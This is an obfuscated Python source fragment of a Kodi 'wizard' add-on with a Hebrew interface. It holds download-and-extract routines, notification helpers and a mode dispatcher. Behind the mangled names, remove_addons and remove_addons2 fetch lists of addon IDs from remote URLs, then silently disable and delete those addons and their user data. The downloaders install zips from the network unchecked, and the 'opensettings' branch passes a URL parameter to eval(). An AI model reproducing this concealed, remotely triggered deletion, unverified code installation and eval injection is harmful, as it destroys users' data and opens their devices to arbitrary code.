    OO0OO00O00O0O00OO =xbmc .translatePath (os .path .join ('special://home/addons','packages'))#line:5058
    OOO0O00OOO0OO0O00 =xbmcgui .DialogProgress ()#line:5059
    OOO0O00OOO0OO0O00 .create ("[B][COLOR=green]מתקין את ההרחבה גאיה[/COLOR][/B]","[B][COLOR=yellow]מוריד....[/COLOR][/B]" '','אנא המתן')#line:5060
    O0O00O0OOOOOOO000 =os .path .join (PACKAGES ,'isr.zip')#line:5061
    OOO0OO000O0OOO000 =urllib2 .Request (O00OOOO0OOOOOOOOO )#line:5062
    OOOOO0O00O0O0000O =urllib2 .urlopen (OOO0OO000O0OOO000 )#line:5063
    O000O00OO00O0O0OO =xbmcgui .DialogProgress ()#line:5065
    O000O00OO00O0O0OO .create ("[B][COLOR=green]מתקין את ההרחבה גאיה[/COLOR][/B]","[B][COLOR=yellow]מוריד....[/COLOR][/B]")#line:5066
    O000O00OO00O0O0OO .update (0 )#line:5067
    OO0O00O0OO000O0O0 =open (O0O00O0OOOOOOO000 ,'wb')#line:5069
    try :#line:5071
      O0000O00OO00000O0 =OOOOO0O00O0O0000O .info ().getheader ('Content-Length').strip ()#line:5072
      O0O0OOOO0O0000O00 =True #line:5073
    except AttributeError :#line:5074
          O0O0OOOO0O0000O00 =False #line:5075
    if O0O0OOOO0O0000O00 :#line:5077
          O0000O00OO00000O0 =int (O0000O00OO00000O0 )#line:5078
    O00OO00OO000O0OOO =0 #line:5080
    O000OO0O0O00OOO0O =time .time ()#line:5081
    while True :#line:5082
          O0O0O0OOOOO000000 =OOOOO0O00O0O0000O .read (8192 )#line:5083
          if not O0O0O0OOOOO000000 :#line:5084
              sys .stdout .write ('\n')#line:5085
              break #line:5086
          O00OO00OO000O0OOO +=len (O0O0O0OOOOO000000 )#line:5088
          OO0O00O0OO000O0O0 .write (O0O0O0OOOOO000000 )#line:5089
          if not O0O0OOOO0O0000O00 :#line:5091
              O0000O00OO00000O0 =O00OO00OO000O0OOO #line:5092
          if O000O00OO00O0O0OO .iscanceled ():#line:5093
             O000O00OO00O0O0OO .close ()#line:5094
             try :#line:5095
              os .remove (O0O00O0OOOOOOO000 )#line:5096
             except :#line:5097
              pass #line:5098
             break #line:5099
          O0OO0OO00000O0OOO =float (O00OO00OO000O0OOO )/O0000O00OO00000O0 #line:5100
          O0OO0OO00000O0OOO =round (O0OO0OO00000O0OOO *100 ,2 )#line:5101
          O0OOO0OO0O00OOO00 =O00OO00OO000O0OOO /(1024 *1024 )#line:5102
          OOOO0OO0OO00O000O =O0000O00OO00000O0 /(1024 *1024 )#line:5103
          OO00000O00O0OOO00 ='[COLOR %s][B]Size:[/B] [COLOR %s]%.02f[/COLOR] MB of [COLOR %s]%.02f[/COLOR] MB[/COLOR]'%('teal','skyblue',O0OOO0OO0O00OOO00 ,'teal',OOOO0OO0OO00O000O )#line:5104
          if (time .time ()-O000OO0O0O00OOO0O )>0 :#line:5105
            OO00O000000OOO0O0 =O00OO00OO000O0OOO /(time .time ()-O000OO0O0O00OOO0O )#line:5106
            OO00O000000OOO0O0 =OO00O000000OOO0O0 /1024 #line:5107
          else :#line:5108
           OO00O000000OOO0O0 =0 #line:5109
          OOO00OO0OO0OOOO00 ='KB'#line:5110
          if OO00O000000OOO0O0 >=1024 :#line:5111
             OO00O000000OOO0O0 =OO00O000000OOO0O0 /1024 #line:5112
             OOO00OO0OO0OOOO00 ='MB'#line:5113
          if OO00O000000OOO0O0 >0 and not O0OO0OO00000O0OOO ==100 :#line:5114
              OOOOO000O00OO0OO0 =(O0000O00OO00000O0 -O00OO00OO000O0OOO )/OO00O000000OOO0O0 #line:5115
          else :#line:5116
              OOOOO000O00OO0OO0 =0 #line:5117
          O000O0OOOOO000OO0 ='[COLOR %s][B]Speed:[/B] [COLOR %s]%.02f [/COLOR]%s/s '%('teal','skyblue',OO00O000000OOO0O0 ,OOO00OO0OO0OOOO00 )#line:5118
          O000O00OO00O0O0OO .update (int (O0OO0OO00000O0OOO ),OO00000O00O0OOO00 ,O000O0OOOOO000OO0 +"[B][COLOR=yellow]מוריד.... [/COLOR][/B]")#line:5120
    O00O000000000O0OO =xbmc .translatePath (os .path .join ('special://home/addons'))#line:5123
    OO0O00O0OO000O0O0 .close ()#line:5126
    extract .all (O0O00O0OOOOOOO000 ,O00O000000000O0OO ,O000O00OO00O0O0OO )#line:5127
    try :#line:5131
      os .remove (O0O00O0OOOOOOO000 )#line:5132
    except :#line:5133
      pass #line:5134
def iptvsimpldown ():#line:5135
    OOO000OOO0OO0OOO0 =(IPTVSIMPL18 )#line:5137
    OO0000OOOO0O000OO =xbmc .translatePath (os .path .join ('special://home/addons','packages'))#line:5138
    O00OOOO0O00OO00O0 =xbmcgui .DialogProgress ()#line:5139
    O00OOOO0O00OO00O0 .create ("[B][COLOR=green]מוריד לוקח טלוויזיה חיה[/COLOR][/B]","[B][COLOR=yellow]מוריד....[/COLOR][/B]" '','אנא המתן')#line:5140
    OOO0OOOOO00O000OO =os .path .join (PACKAGES ,'isr.zip')#line:5141
    O0000000OOOO0O000 =urllib2 .Request (OOO000OOO0OO0OOO0 )#line:5142
    O00O0OO000OO0O00O =urllib2 .urlopen (O0000000OOOO0O000 )#line:5143
    OO0O000O0OO0O00O0 =xbmcgui .DialogProgress ()#line:5145
    OO0O000O0OO0O00O0 .create ("[B][COLOR=green]מוריד לוקח טלוויזיה חיה[/COLOR][/B]","[B][COLOR=yellow]מוריד....[/COLOR][/B]")#line:5146
    OO0O000O0OO0O00O0 .update (0 )#line:5147
    O0OOOO0000OOO00OO =open (OOO0OOOOO00O000OO ,'wb')#line:5149
    try :#line:5151
      O0O0O0O0O000OOO0O =O00O0OO000OO0O00O .info ().getheader ('Content-Length').strip ()#line:5152
      O0OO00O0O000O0000 =True #line:5153
    except AttributeError :#line:5154
          O0OO00O0O000O0000 =False #line:5155
    if O0OO00O0O000O0000 :#line:5157
          O0O0O0O0O000OOO0O =int (O0O0O0O0O000OOO0O )#line:5158
    OOO0OO0O0O000O000 =0 #line:5160
    OOO000O0OOO0OOOOO =time .time ()#line:5161
    while True :#line:5162
          OOO0O0O00O0O00O0O =O00O0OO000OO0O00O .read (8192 )#line:5163
          if not OOO0O0O00O0O00O0O :#line:5164
              sys .stdout .write ('\n')#line:5165
              break #line:5166
          OOO0OO0O0O000O000 +=len (OOO0O0O00O0O00O0O )#line:5168
          O0OOOO0000OOO00OO .write (OOO0O0O00O0O00O0O )#line:5169
          if not O0OO00O0O000O0000 :#line:5171
              O0O0O0O0O000OOO0O =OOO0OO0O0O000O000 #line:5172
          if OO0O000O0OO0O00O0 .iscanceled ():#line:5173
             OO0O000O0OO0O00O0 .close ()#line:5174
             try :#line:5175
              os .remove (OOO0OOOOO00O000OO )#line:5176
             except :#line:5177
              pass #line:5178
             break #line:5179
          O00OOO00O0OO0O0OO =float (OOO0OO0O0O000O000 )/O0O0O0O0O000OOO0O #line:5180
          O00OOO00O0OO0O0OO =round (O00OOO00O0OO0O0OO *100 ,2 )#line:5181
          O0O00OOO0000O000O =OOO0OO0O0O000O000 /(1024 *1024 )#line:5182
          O0O0OOO0OOO0O0OOO =O0O0O0O0O000OOO0O /(1024 *1024 )#line:5183
          OOOOOO0OOO0OOO000 ='[COLOR %s][B]Size:[/B] [COLOR %s]%.02f[/COLOR] MB of [COLOR %s]%.02f[/COLOR] MB[/COLOR]'%('teal','skyblue',O0O00OOO0000O000O ,'teal',O0O0OOO0OOO0O0OOO )#line:5184
          if (time .time ()-OOO000O0OOO0OOOOO )>0 :#line:5185
            O00O0000OO0OO00OO =OOO0OO0O0O000O000 /(time .time ()-OOO000O0OOO0OOOOO )#line:5186
            O00O0000OO0OO00OO =O00O0000OO0OO00OO /1024 #line:5187
          else :#line:5188
           O00O0000OO0OO00OO =0 #line:5189
          O0O00O0OO0000O0OO ='KB'#line:5190
          if O00O0000OO0OO00OO >=1024 :#line:5191
             O00O0000OO0OO00OO =O00O0000OO0OO00OO /1024 #line:5192
             O0O00O0OO0000O0OO ='MB'#line:5193
          if O00O0000OO0OO00OO >0 and not O00OOO00O0OO0O0OO ==100 :#line:5194
              OO0O000OOOO0OO000 =(O0O0O0O0O000OOO0O -OOO0OO0O0O000O000 )/O00O0000OO0OO00OO #line:5195
          else :#line:5196
              OO0O000OOOO0OO000 =0 #line:5197
          OO000O0000OO000O0 ='[COLOR %s][B]Speed:[/B] [COLOR %s]%.02f [/COLOR]%s/s '%('teal','skyblue',O00O0000OO0OO00OO ,O0O00O0OO0000O0OO )#line:5198
          OO0O000O0OO0O00O0 .update (int (O00OOO00O0OO0O0OO ),OOOOOO0OOO0OOO000 ,OO000O0000OO000O0 +"[B][COLOR=yellow]מוריד.... [/COLOR][/B]")#line:5200
    O00O00OO00OO000O0 =xbmc .translatePath (os .path .join ('special://home/addons'))#line:5203
    O0OOOO0000OOO00OO .close ()#line:5206
    extract .all (OOO0OOOOO00O000OO ,O00O00OO00OO000O0 ,OO0O000O0OO0O00O0 )#line:5207
    try :#line:5211
      os .remove (OOO0OOOOO00O000OO )#line:5212
    except :#line:5213
      pass #line:5214
def testnotify ():#line:5215
	O0O0O00OO000O0O0O =wiz .workingURL (NOTIFICATION )#line:5216
	if O0O0O00OO000O0O0O ==True :#line:5217
		try :#line:5218
			O00O0OOOOOO000000 ,O0000O0O000O0O00O =wiz .splitNotify (NOTIFICATION )#line:5219
			if O00O0OOOOOO000000 ==False :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]אין עדכון מהיר[/COLOR]"%COLOR2 );return #line:5220
			if STARTP2 ()=='ok':#line:5221
				notify .notification (O0000O0O000O0O00O ,True )#line:5222
		except Exception as O000OOOO00OO000O0 :#line:5223
			wiz .log ("Error on Notifications Window: %s"%str (O000OOOO00OO000O0 ),xbmc .LOGERROR )#line:5224
	else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]אין עדכון מהיר[/COLOR]"%COLOR2 )#line:5225
def testnotify2 ():#line:5226
	O0OOO0O0OOO0000O0 =wiz .workingURL (NOTIFICATION2 )#line:5227
	if O0OOO0O0OOO0000O0 ==True :#line:5228
		try :#line:5229
			OOOO00OOO0OO0OO0O ,OO0O0OOO0OO00OOO0 =wiz .splitNotify (NOTIFICATION2 )#line:5230
			if OOOO00OOO0OO0OO0O ==False :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]אין עדכון מהיר[/COLOR]"%COLOR2 );return #line:5231
			if STARTP2 ()=='ok':#line:5232
				notify .notification2 (OO0O0OOO0OO00OOO0 ,True )#line:5233
		except Exception as OOOOOOO0OOO000OOO :#line:5234
			wiz .log ("Error on Notifications Window: %s"%str (OOOOOOO0OOO000OOO ),xbmc .LOGERROR )#line:5235
	else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]אין עדכון מהיר[/COLOR]"%COLOR2 )#line:5236
def testnotify3 ():#line:5237
	O0O00O0O0OOO00000 =wiz .workingURL (NOTIFICATION3 )#line:5238
	if O0O00O0O0OOO00000 ==True :#line:5239
		try :#line:5240
			O0O0O0O000O000000 ,OO0OO0OO00O000O0O =wiz .splitNotify (NOTIFICATION3 )#line:5241
			if O0O0O0O000O000000 ==False :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]אין עדכון מהיר[/COLOR]"%COLOR2 );return #line:5242
			if STARTP2 ()=='ok':#line:5243
				notify .notification3 (OO0OO0OO00O000O0O ,True )#line:5244
		except Exception as O00O0OO0O0O00O00O :#line:5245
			wiz .log ("Error on Notifications Window: %s"%str (O00O0OO0O0O00O00O ),xbmc .LOGERROR )#line:5246
	else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]אין עדכון מהיר[/COLOR]"%COLOR2 )#line:5247
def servicemanual ():#line:5248
	O0OOO000000O00O0O =wiz .workingURL (HELPINFO )#line:5249
	if O0OOO000000O00O0O ==True :#line:5250
		try :#line:5251
			O0O0000O0O0O00O0O ,OO000OO00O0O00OOO =wiz .splitNotify (HELPINFO )#line:5252
			if O0O0000O0O0O00O0O ==False :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Notification: Not Formated Correctly[/COLOR]"%COLOR2 );return #line:5253
			notify .helpinfo (OO000OO00O0O00OOO ,True )#line:5254
		except Exception as O0O00OO0O0O00O0O0 :#line:5255
			wiz .log ("Error on Notifications Window: %s"%str (O0O00OO0O0O00O0O0 ),xbmc .LOGERROR )#line:5256
	else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Invalid URL for Notification[/COLOR]"%COLOR2 )#line:5257
def testupdate ():#line:5259
	if BUILDNAME =="":#line:5260
		notify .updateWindow ()#line:5261
	else :#line:5262
		notify .updateWindow (BUILDNAME ,BUILDVERSION ,BUILDLATEST ,wiz .checkBuild (BUILDNAME ,'icon'),wiz .checkBuild (BUILDNAME ,'fanart'))#line:5263
def testfirst ():#line:5265
	notify .firstRun ()#line:5266
def testfirstRun ():#line:5268
	notify .firstRunSettings ()#line:5269
def fastinstall ():#line:5272
	notify .firstRuninstall ()#line:5273
def addDir (O0O0O0OO00OOOO0OO ,mode =None ,name =None ,url =None ,menu =None ,description =ADDONTITLE ,overwrite =True ,fanart =FANART ,icon =ICON ,themeit =None ):#line:5280
	OO00O00000O0OOO0O =sys .argv [0 ]#line:5281
	if not mode ==None :OO00O00000O0OOO0O +="?mode=%s"%urllib .quote_plus (mode )#line:5282
	if not name ==None :OO00O00000O0OOO0O +="&name="+urllib .quote_plus (name )#line:5283
	if not url ==None :OO00O00000O0OOO0O +="&url="+urllib .quote_plus (url )#line:5284
	OOO0OOO0OO00OOO00 =True #line:5285
	if themeit :O0O0O0OO00OOOO0OO =themeit %O0O0O0OO00OOOO0OO #line:5286
	OOO000OO000O0OOOO =xbmcgui .ListItem (O0O0O0OO00OOOO0OO ,iconImage ="DefaultFolder.png",thumbnailImage =icon )#line:5287
	OOO000OO000O0OOOO .setInfo (type ="Video",infoLabels ={"Title":O0O0O0OO00OOOO0OO ,"Plot":description })#line:5288
	OOO000OO000O0OOOO .setProperty ("Fanart_Image",fanart )#line:5289
	if not menu ==None :OOO000OO000O0OOOO .addContextMenuItems (menu ,replaceItems =overwrite )#line:5290
	OOO0OOO0OO00OOO00 =xbmcplugin .addDirectoryItem (handle =int (sys .argv [1 ]),url =OO00O00000O0OOO0O ,listitem =OOO000OO000O0OOOO ,isFolder =True )#line:5291
	return OOO0OOO0OO00OOO00 #line:5292
def addFile (O00OOOO000OO0O000 ,mode =None ,name =None ,url =None ,menu =None ,description =ADDONTITLE ,overwrite =True ,fanart =FANART ,icon =ICON ,themeit =None ):#line:5294
	O0000OOOO0O0000O0 =sys .argv [0 ]#line:5295
	if not mode ==None :O0000OOOO0O0000O0 +="?mode=%s"%urllib .quote_plus (mode )#line:5296
	if not name ==None :O0000OOOO0O0000O0 +="&name="+urllib .quote_plus (name )#line:5297
	if not url ==None :O0000OOOO0O0000O0 +="&url="+urllib .quote_plus (url )#line:5298
	O0OOO0OO0O0000O0O =True #line:5299
	if themeit :O00OOOO000OO0O000 =themeit %O00OOOO000OO0O000 #line:5300
	O00O000O0OO000O00 =xbmcgui .ListItem (O00OOOO000OO0O000 ,iconImage ="DefaultFolder.png",thumbnailImage =icon )#line:5301
	O00O000O0OO000O00 .setInfo (type ="Video",infoLabels ={"Title":O00OOOO000OO0O000 ,"Plot":description })#line:5302
	O00O000O0OO000O00 .setProperty ("Fanart_Image",fanart )#line:5303
	if not menu ==None :O00O000O0OO000O00 .addContextMenuItems (menu ,replaceItems =overwrite )#line:5304
	O0OOO0OO0O0000O0O =xbmcplugin .addDirectoryItem (handle =int (sys .argv [1 ]),url =O0000OOOO0O0000O0 ,listitem =O00O000O0OO000O00 ,isFolder =False )#line:5305
	return O0OOO0OO0O0000O0O #line:5306
def get_params ():#line:5308
	OOOO00000O000OO0O =[]#line:5309
	OO0OOOOOO00O0OOO0 =sys .argv [2 ]#line:5310
	if len (OO0OOOOOO00O0OOO0 )>=2 :#line:5311
		OO0OO0O00O0O00OO0 =sys .argv [2 ]#line:5312
		OO00000O0OO0O0O0O =OO0OO0O00O0O00OO0 .replace ('?','')#line:5313
		if (OO0OO0O00O0O00OO0 [len (OO0OO0O00O0O00OO0 )-1 ]=='/'):#line:5314
			OO0OO0O00O0O00OO0 =OO0OO0O00O0O00OO0 [0 :len (OO0OO0O00O0O00OO0 )-2 ]#line:5315
		O0O0OO0OO00OOOOOO =OO00000O0OO0O0O0O .split ('&')#line:5316
		OOOO00000O000OO0O ={}#line:5317
		for OO0OOOO0OOO0O00OO in range (len (O0O0OO0OO00OOOOOO )):#line:5318
			OO00O0O0000O0OOO0 ={}#line:5319
			OO00O0O0000O0OOO0 =O0O0OO0OO00OOOOOO [OO0OOOO0OOO0O00OO ].split ('=')#line:5320
			if (len (OO00O0O0000O0OOO0 ))==2 :#line:5321
				OOOO00000O000OO0O [OO00O0O0000O0OOO0 [0 ]]=OO00O0O0000O0OOO0 [1 ]#line:5322
		return OOOO00000O000OO0O #line:5324
def remove_addons ():#line:5326
	try :#line:5327
			import json #line:5328
			OOO00O0000OOO000O =urllib2 .urlopen (remove_url ).readlines ()#line:5329
			for OOO00OO00000O00O0 in OOO00O0000OOO000O :#line:5330
				O000OO00000O00OOO =OOO00OO00000O00O0 .split (':')[1 ].strip ()#line:5332
				OOOOO00OOOO00OOOO ='{"jsonrpc":"2.0","id":1,"method":"Addons.SetAddonEnabled","params":{"addonid":"%s","enabled":%s}}'%(O000OO00000O00OOO ,'false')#line:5333
				O000OOO0000O0OO00 =xbmc .executeJSONRPC (OOOOO00OOOO00OOOO )#line:5334
				O000O00000000O000 =json .loads (O000OOO0000O0OO00 )#line:5335
				OOOOOO000OOO0O0O0 =os .path .join (addons_folder ,O000OO00000O00OOO )#line:5337
				if os .path .exists (OOOOOO000OOO0O0O0 ):#line:5339
					for O0OO00O0O0OO000O0 ,OO0O00OO00OO00000 ,OO00O00OO0O00000O in os .walk (OOOOOO000OOO0O0O0 ):#line:5340
						for O0O0O0O00O00O00OO in OO00O00OO0O00000O :#line:5341
							os .unlink (os .path .join (O0OO00O0O0OO000O0 ,O0O0O0O00O00O00OO ))#line:5342
						for OOOOO00O00O00OO0O in OO0O00OO00OO00000 :#line:5343
							shutil .rmtree (os .path .join (O0OO00O0O0OO000O0 ,OOOOO00O00O00OO0O ))#line:5344
					os .rmdir (OOOOOO000OOO0O0O0 )#line:5345
			xbmc .executebuiltin ('Container.Refresh')#line:5347
			xbmc .executebuiltin ("XBMC.UpdateLocalAddons()")#line:5348
			xbmc .executebuiltin ('Container.Update(%s)'%xbmc .getInfoLabel ('Container.FolderPath'))#line:5349
	except :pass #line:5350
def remove_addons2 ():#line:5351
	try :#line:5352
			import json #line:5353
			O0O0OOOOO00OOOOOO =urllib2 .urlopen (remove_url2 ).readlines ()#line:5354
			for OOO00O00000O0OO0O in O0O0OOOOO00OOOOOO :#line:5355
				O0OO00O000O0OOO00 =OOO00O00000O0OO0O .split (':')[1 ].strip ()#line:5357
				OO0OO0OO0O000O0O0 ='{"jsonrpc":"2.0","id":1,"method":"Addons.SetAddonEnabled1","params":{"addonid":"%s","enabled":%s}}'%(O0OO00O000O0OOO00 ,'false')#line:5358
				OO0000O0O0OO0OOO0 =xbmc .executeJSONRPC (OO0OO0OO0O000O0O0 )#line:5359
				O0O0O0O0O00O00OO0 =json .loads (OO0000O0O0OO0OOO0 )#line:5360
				OOOOOO000OO0OO0OO =os .path .join (user_folder ,O0OO00O000O0OOO00 )#line:5362
				if os .path .exists (OOOOOO000OO0OO0OO ):#line:5364
					for OOOO000O0OO00OO00 ,OOO0000O00000O0O0 ,OO000000O0O000000 in os .walk (OOOOOO000OO0OO0OO ):#line:5365
						for O000O0OOOOO00OO00 in OO000000O0O000000 :#line:5366
							os .unlink (os .path .join (OOOO000O0OO00OO00 ,O000O0OOOOO00OO00 ))#line:5367
						for OO0OOO0OO0O000O00 in OOO0000O00000O0O0 :#line:5368
							shutil .rmtree (os .path .join (OOOO000O0OO00OO00 ,OO0OOO0OO0O000O00 ))#line:5369
					os .rmdir (OOOOOO000OO0OO0OO )#line:5370
	except :pass #line:5372
params =get_params ()#line:5373
url =None #line:5374
name =None #line:5375
mode =None #line:5376
try :mode =urllib .unquote_plus (params ["mode"])#line:5378
except :pass #line:5379
try :name =urllib .unquote_plus (params ["name"])#line:5380
except :pass #line:5381
try :url =urllib .unquote_plus (params ["url"])#line:5382
except :pass #line:5383
wiz .log ('[ Version : \'%s\' ] [ Mode : \'%s\' ] [ Name : \'%s\' ] [ Url : \'%s\' ]'%(VERSION ,mode if not mode ==''else None ,name ,url ))#line:5385
wiz .log ("AAAAAAAAAAAAAAAAAAAAAAAAAA URL: %s"%mode )#line:5386
def setView (O00O0000O00OOO0O0 ,OOO00OOO00O000O0O ):#line:5387
	if wiz .getS ('auto-view')=='true':#line:5388
		OO000000O0O0OO0O0 =wiz .getS (OOO00OOO00O000O0O )#line:5389
		if OO000000O0O0OO0O0 =='50'and KODIV >=17 and SKIN =='skin.estuary':OO000000O0O0OO0O0 ='55'#line:5390
		if OO000000O0O0OO0O0 =='500'and KODIV >=17 and SKIN =='skin.estuary':OO000000O0O0OO0O0 ='50'#line:5391
		wiz .ebi ("Container.SetViewMode(%s)"%OO000000O0O0OO0O0 )#line:5392
if mode ==None :index ()#line:5394
elif mode =='wizardupdate':wiz .wizardUpdate ()#line:5396
elif mode =='builds':buildMenu ()#line:5397
elif mode =='viewbuild':viewBuild (name )#line:5398
elif mode =='buildinfo':buildInfo (name )#line:5399
elif mode =='buildpreview':buildVideo (name )#line:5400
elif mode =='install':buildWizard (name ,url )#line:5401
elif mode =='theme':buildWizard (name ,mode ,url )#line:5402
elif mode =='viewthirdparty':viewThirdList (name )#line:5403
elif mode =='installthird':thirdPartyInstall (name ,url )#line:5404
elif mode =='editthird':editThirdParty (name );wiz .refresh ()#line:5405
elif mode =='maint':maintMenu (name )#line:5407
elif mode =='passpin':passandpin ()#line:5408
elif mode =='backmyupbuild':backmyupbuild ()#line:5409
elif mode =='kodi17fix':wiz .kodi17Fix ()#line:5410
elif mode =='kodi177fix':wiz .kodi177Fix ()#line:5411
elif mode =='advancedsetting':advancedWindow (name )#line:5412
elif mode =='autoadvanced':showAutoAdvanced ();wiz .refresh ()#line:5413
elif mode =='removeadvanced':removeAdvanced ();wiz .refresh ()#line:5414
elif mode =='asciicheck':wiz .asciiCheck ()#line:5415
elif mode =='backupbuild':wiz .backUpOptions ('build')#line:5416
elif mode =='backupgui':wiz .backUpOptions ('guifix')#line:5417
elif mode =='backuptheme':wiz .backUpOptions ('theme')#line:5418
elif mode =='backupaddon':wiz .backUpOptions ('addondata')#line:5419
elif mode =='oldThumbs':wiz .oldThumbs ()#line:5420
elif mode =='clearbackup':wiz .cleanupBackup ()#line:5421
elif mode =='convertpath':wiz .convertSpecial (HOME )#line:5422
elif mode =='currentsettings':viewAdvanced ()#line:5423
elif mode =='fullclean':totalClean ();wiz .refresh ()#line:5424
elif mode =='clearcache':clearCache ();wiz .refresh ()#line:5425
elif mode =='fixwizard':fixwizard ();wiz .refresh ()#line:5426
elif mode =='fixskin':backtokodi ()#line:5427
elif mode =='testcommand':testcommand ()#line:5428
elif mode =='logsend':logsend ()#line:5429
elif mode =='rdon':rdon ()#line:5430
elif mode =='rdoff':rdoff ()#line:5431
elif mode =='setrd':setrealdebrid ()#line:5432
elif mode =='setrd2':setautorealdebrid ()#line:5433
elif mode =='clearpackages':wiz .clearPackages ();wiz .refresh ()#line:5434
elif mode =='clearcrash':wiz .clearCrash ();wiz .refresh ()#line:5435
elif mode =='clearthumb':clearThumb ();wiz .refresh ()#line:5436
elif mode =='checksources':wiz .checkSources ();wiz .refresh ()#line:5437
elif mode =='checkrepos':wiz .checkRepos ();wiz .refresh ()#line:5438
elif mode =='freshstart':freshStart ()#line:5439
elif mode =='forceupdate':wiz .forceUpdate ()#line:5440
elif mode =='forceprofile':wiz .reloadProfile (wiz .getInfo ('System.ProfileName'))#line:5441
elif mode =='forceclose':wiz .killxbmc ()#line:5442
elif mode =='forceskin':wiz .ebi ("ReloadSkin()");wiz .refresh ()#line:5443
elif mode =='hidepassword':wiz .hidePassword ()#line:5444
elif mode =='unhidepassword':wiz .unhidePassword ()#line:5445
elif mode =='enableaddons':enableAddons ()#line:5446
elif mode =='toggleaddon':wiz .toggleAddon (name ,url );wiz .refresh ()#line:5447
elif mode =='togglecache':toggleCache (name );wiz .refresh ()#line:5448
elif mode =='toggleadult':wiz .toggleAdult ();wiz .refresh ()#line:5449
elif mode =='changefeq':changeFeq ();wiz .refresh ()#line:5450
elif mode =='uploadlog':uploadLog .Main ()#line:5451
elif mode =='viewlog':LogViewer ()#line:5452
elif mode =='viewwizlog':LogViewer (WIZLOG )#line:5453
elif mode =='viewerrorlog':errorChecking (all =True )#line:5454
elif mode =='clearwizlog':f =open (WIZLOG ,'w');f .close ();wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Wizard Log Cleared![/COLOR]"%COLOR2 )#line:5455
elif mode =='purgedb':purgeDb ()#line:5456
elif mode =='fixaddonupdate':fixUpdate ()#line:5457
elif mode =='removeaddons':removeAddonMenu ()#line:5458
elif mode =='removeaddon':removeAddon (name )#line:5459
elif mode =='removeaddondata':removeAddonDataMenu ()#line:5460
elif mode =='removedata':removeAddonData (name )#line:5461
elif mode =='resetaddon':total =wiz .cleanHouse (ADDONDATA ,ignore =True );wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Addon_Data reset[/COLOR]"%COLOR2 )#line:5462
elif mode =='systeminfo':systemInfo ()#line:5463
elif mode =='restorezip':restoreit ('build')#line:5464
elif mode =='restoregui':restoreit ('gui')#line:5465
elif mode =='restoreaddon':restoreit ('addondata')#line:5466
elif mode =='restoreextzip':restoreextit ('build')#line:5467
elif mode =='restoreextgui':restoreextit ('gui')#line:5468
elif mode =='restoreextaddon':restoreextit ('addondata')#line:5469
elif mode =='writeadvanced':writeAdvanced (name ,url )#line:5470
elif mode =='traktsync':traktsync ()#line:5471
elif mode =='apk':apkMenu (name )#line:5473
elif mode =='apkscrape':apkScraper (name )#line:5474
elif mode =='apkinstall':apkInstaller (name ,url )#line:5475
elif mode =='speed':speedMenu ()#line:5476
elif mode =='net':net_tools ()#line:5477
elif mode =='GetList':GetList (url )#line:5478
elif mode =='youtube':youtubeMenu (name )#line:5479
elif mode =='viewVideo':playVideo (url )#line:5480
elif mode =='addons':addonMenu (name )#line:5482
elif mode =='addoninstall':addonInstaller (name ,url )#line:5483
elif mode =='savedata':saveMenu ()#line:5485
elif mode =='togglesetting':wiz .setS (name ,'false'if wiz .getS (name )=='true'else 'true');wiz .refresh ()#line:5486
elif mode =='managedata':manageSaveData (name )#line:5487
elif mode =='whitelist':wiz .whiteList (name )#line:5488
elif mode =='trakt':traktMenu ()#line:5490
elif mode =='savetrakt':traktit .traktIt ('update',name )#line:5491
elif mode =='restoretrakt':traktit .traktIt ('restore',name )#line:5492
elif mode =='addontrakt':traktit .traktIt ('clearaddon',name )#line:5493
elif mode =='cleartrakt':traktit .clearSaved (name )#line:5494
elif mode =='authtrakt':traktit .activateTrakt (name );wiz .refresh ()#line:5495
elif mode =='updatetrakt':traktit .autoUpdate ('all')#line:5496
elif mode =='importtrakt':traktit .importlist (name );wiz .refresh ()#line:5497
elif mode =='realdebrid':realMenu ()#line:5499
elif mode =='savedebrid':debridit .debridIt ('update',name )#line:5500
elif mode =='restoredebrid':debridit .debridIt ('restore',name )#line:5501
elif mode =='addondebrid':debridit .debridIt ('clearaddon',name )#line:5502
elif mode =='cleardebrid':debridit .clearSaved (name )#line:5503
elif mode =='authdebrid':debridit .activateDebrid (name );wiz .refresh ()#line:5504
elif mode =='updatedebrid':debridit .autoUpdate ('all')#line:5505
elif mode =='importdebrid':debridit .importlist (name );wiz .refresh ()#line:5506
elif mode =='login':loginMenu ()#line:5508
elif mode =='savelogin':loginit .loginIt ('update',name )#line:5509
elif mode =='restorelogin':loginit .loginIt ('restore',name )#line:5510
elif mode =='addonlogin':loginit .loginIt ('clearaddon',name )#line:5511
elif mode =='clearlogin':loginit .clearSaved (name )#line:5512
elif mode =='authlogin':loginit .activateLogin (name );wiz .refresh ()#line:5513
elif mode =='updatelogin':loginit .autoUpdate ('all')#line:5514
elif mode =='importlogin':loginit .importlist (name );wiz .refresh ()#line:5515
elif mode =='contact':notify .contact (CONTACT )#line:5517
elif mode =='settings':wiz .openS (name );wiz .refresh ()#line:5518
elif mode =='opensettings':id =eval (url .upper ()+'ID')[name ]['plugin'];addonid =wiz .addonId (id );addonid .openSettings ();wiz .refresh ()#line:5519
elif mode =='developer':developer ()#line:5521
elif mode =='converttext':wiz .convertText ()#line:5522
elif mode =='createqr':wiz .createQR ()#line:5523
elif mode =='testnotify':testnotify ()#line:5524
elif mode =='testnotify2':testnotify2 ()#line:5525
elif mode =='servicemanual':servicemanual ()#line:5526
elif mode =='fastinstall':fastinstall ()#line:5527
elif mode =='testupdate':testupdate ()#line:5528
elif mode =='testfirst':testfirst ()#line:5529
elif mode =='testfirstrun':testfirstRun ()#line:5530
elif mode =='testapk':notify .apkInstaller ('SPMC')#line:5531
